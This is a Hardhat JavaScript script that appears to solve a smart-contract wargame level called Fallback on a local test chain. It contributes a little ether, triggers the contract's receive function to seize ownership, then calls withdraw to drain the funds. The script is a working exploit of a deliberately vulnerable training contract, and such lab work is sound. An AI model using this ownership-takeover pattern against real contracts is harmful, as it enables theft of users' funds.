const hre = require("hardhat");

async function main() {

    const provider = new ethers.providers.JsonRpcProvider(
		"http://127.0.0.1:8545/"
	);

	// These are Harhdat's deterministic accounts
	// NEVER SEND REAL FUNDS TO THESE ACCOUNTS!
    //0x1eAfC025a56ecA9d0880eE92Ad32944B10F1E3E8 -> player address
	const wallet = new ethers.Wallet(
		"0xac1d2de5bb160f57820767f82868f942f74b39a2388bcbf3221a7789201d600c",
		provider
	);  

  // Assuming you have a contract already deployed
  const contractAddress = "0x73D2eBdbb80884a63A3B162ea447c1AFfc7bB896";
  const contractjson = require("../artifacts/contracts/Fallback.sol/Fallback.json");
  const abi = contractjson.abi;
  
  const contract = new ethers.Contract(contractAddress, abi, wallet);

  console.log("Player : ",wallet.address);

  const contrib = await contract.getContribution();
  console.log("Contribution player address : ",contrib)
    
  const owner = await contract.owner();
  console.log("Owner address : ",owner)
  
  console.log("*** Run this transaction to modify contributions value of player ***");
  // Sending 0.001 ether along with the transaction
  let amountInWei = ethers.utils.parseEther("0.0001");
  const txResponse = await contract.contribute({
        value: amountInWei
    });

console.log('Transaction hash:', txResponse.hash);

await txResponse.wait();
console.log('Transaction confirmed');

console.log("*** Run this transaction to Execute the Fallback recieve function ***");

amountInWei = ethers.utils.parseEther('0.000001');

   const txResponse2 = await wallet.sendTransaction({
       to: contractAddress,
       value: amountInWei
   });

   console.log('Transaction hash:', txResponse2.hash);

   await txResponse2.wait();
   console.log('Transaction confirmed');

   const ownernew = await contract.owner();
  console.log("Owner address new: ",ownernew)

  await contract.withdraw(); // call withdraw here

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
